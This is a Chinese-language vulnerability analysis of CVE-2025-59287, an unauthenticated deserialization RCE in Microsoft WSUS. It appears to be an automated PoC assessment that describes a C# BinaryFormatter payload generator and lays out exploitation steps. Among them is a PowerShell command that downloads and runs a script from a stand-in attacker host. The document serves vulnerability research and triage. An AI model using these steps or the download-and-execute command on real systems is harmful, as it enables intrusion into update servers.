## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 远程代码执行 (RCE) / 不安全反序列化

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 远程代码执行 (RCE) / 不安全反序列化

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危

**CVSS评分:** 9.8

**影响版本:** Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022, Windows Server 2025 (WSUS组件)

**利用条件:** 无需认证，远程网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Payload Generator)

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

POC有效性分析:
提供的POC代码`BinaryFormatterPayloadGenerator.cs`是一个高度有效且概念上完善的工具，用于生成针对CVE-2025-59287的恶意payload。这个C#程序明确针对Microsoft Windows Server Update Services (WSUS)中的“不安全反序列化”漏洞，该漏洞涉及`.NET BinaryFormatter`机制。代码的核心机制是利用`ObjectDataProvider` gadget链，这是通过.NET反序列化漏洞实现任意代码执行的成熟技术。

在POC中，`ObjectDataProvider`实例被精心构造。其`MethodName`属性被设置为“Start”，`ObjectInstance`被初始化为`System.Diagnostics.Process`对象。这种设置至关重要，它通过调用`Process.Start`方法使gadget能够执行任意命令。用户通过命令行参数提供给生成器的命令被仔细解析。如果命令包含参数（例如`"powershell -c whoami"`），代码会智能地将其拆分，将可执行路径分配给`ProcessStartInfo.FileName`，其余部分分配给`ProcessStartInfo.Arguments`。对于单个命令，`FileName`直接填充。此外，`UseShellExecute`设置为`false`，`CreateNoWindow`设置为`true`，以确保命令执行在目标服务器上是隐蔽且不显示窗口的。

最后，这个精心构建的、包含恶意逻辑的`ObjectDataProvider`对象使用`System.Runtime.Serialization.Formatters.Binary.BinaryFormatter`被序列化为一个字节数组。生成的二进制流随后写入到一个名为`payload.bin`的文件中。这个序列化过程直接模拟了WSUS中发现的漏洞，即服务不安全地反序列化数据（例如`AuthorizationCookie`）。因此，尽管此POC不包含将`payload.bin`实际交付给WSUS服务器的网络组件，但它成功生成了关键的恶意数据结构，一旦被易受攻击的WSUS组件使用，就会触发RCE。其清晰性、对已知反序列化原语的遵循以及与漏洞描述的直接对应，使其成为漏洞利用中payload生成方面一个强大而有效的概念验证。

利用步骤:
利用CVE-2025-59287的攻击过程相对直接，主要分为以下几个步骤：

1.  **攻击环境准备及编译**: 攻击者需在具备适当.NET Framework版本的Windows系统上（如v4.0.30319）编译提供的C# POC代码。使用`csc.exe`编译`BinaryFormatterPayloadGenerator.cs`，并引用`WindowsBase.dll`，命令示例：`csc /reference:"C:\Windows\Microsoft.NET\Framework\v4.0.30319\WindowsBase.dll" BinaryFormatterPayloadGenerator.cs`。这将生成一个`BinaryFormatterPayloadGenerator.exe`可执行文件。
2.  **生成恶意Payload**: 运行`BinaryFormatterPayloadGenerator.exe`，并提供希望在目标WSUS服务器上执行的命令作为参数。例如：`BinaryFormatterPayloadGenerator.exe "calc.exe"` 或 `BinaryFormatterPayloadGenerator.exe "powershell -c IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/malicious_script.ps1')"`。此操作将生成一个名为`payload.bin`的二进制文件，其中包含了序列化后的恶意`ObjectDataProvider`对象。
3.  **识别目标WSUS服务器**: 攻击者通过网络扫描等方式，识别出网络中运行WSUS服务且存在CVE-2025-59287漏洞的Windows Server目标。
4.  **构造并发送HTTP请求**: 攻击者需开发或使用工具，将`payload.bin`中的内容嵌入到特制的HTTP请求中，作为`AuthorizationCookie`头部或其他WSUS服务处理的反序列化数据字段。由于此漏洞无需身份验证即可触发，攻击者可以直接向WSUS的特定端点发送此请求。
5.  **远程代码执行**: 当WSUS服务接收并处理该请求时，它会反序列化恶意数据，触发`ObjectDataProvider` gadget链，导致WSUS服务器在相应权限下执行攻击者预设的命令，例如启动计算器或执行PowerShell脚本以建立反向Shell。
6.  **后续攻击**: 获得初始代码执行权限后，攻击者通常会进一步执行权限提升、内网横向移动或部署恶意软件等操作。

投毒风险分析:
对提供的POC代码`BinaryFormatterPayloadGenerator.cs`进行深入分析后，可以评估其投毒风险为极低，具体百分比为0%。这一评估基于以下几个关键因素：

首先，**代码的透明性**是投毒风险评估中的核心要素。该POC的源代码是完全公开的C#文件，其逻辑结构清晰明了，没有使用任何形式的代码混淆技术。这意味着任何熟悉C#的审查者都可以轻松地阅读、理解并验证其所有功能，确保没有隐藏的或未声明的操作。

其次，在**依赖项**方面，该POC表现出高度的安全性。它仅依赖于Microsoft .NET Framework的内置标准库，例如用于文件操作的`System.IO`、用于核心反序列化机制的`System.Runtime.Serialization.Formatters.Binary`、用于构建gadget链的`System.Windows.Data`以及用于执行系统进程的`System.Diagnostics`。这些都是操作系统自带且经过广泛审查的库，代码中不涉及任何第三方外部依赖、不明来源的软件包下载或动态加载。这大大降低了引入外部恶意代码的风险。

第三，**功能的高度单一性**进一步证明了其低风险性。该POC的设计目的非常明确：生成一个符合CVE-2025-59287漏洞利用模式的二进制payload。它接收一个字符串作为命令输入，然后将这个命令嵌入到一个序列化的`ObjectDataProvider`对象中，最终将序列化结果输出为一个本地文件`payload.bin`。整个操作流程完全在本地完成，不涉及任何主动的网络连接尝试、外部资源请求或数据传输。代码中没有发现任何尝试联系C2服务器、下载额外组件、执行`eval`或其他动态代码注入的迹象。

最后，通过对代码逻辑的仔细审查，**未发现任何超出其声明目的的隐藏恶意行为**。该POC不会在运行它的机器上执行任何意外操作，也不会植入任何后门、收集敏感信息或进行加密货币挖矿等活动。其唯一的“恶意”方面在于它能够生成可用于攻击的payload，但这正是其作为漏洞利用工具的本质功能。

综上所述，`BinaryFormatterPayloadGenerator.cs`是一个纯粹的、功能单一的、本地化的漏洞利用辅助工具。其代码清晰、依赖标准库、无外部通信且无隐藏恶意功能，因此可以安全地用于合法的防御性安全研究、漏洞复现和安全测试工作，无需担心代码本身被投毒。

**项目地址:** 

**漏洞详情:** 
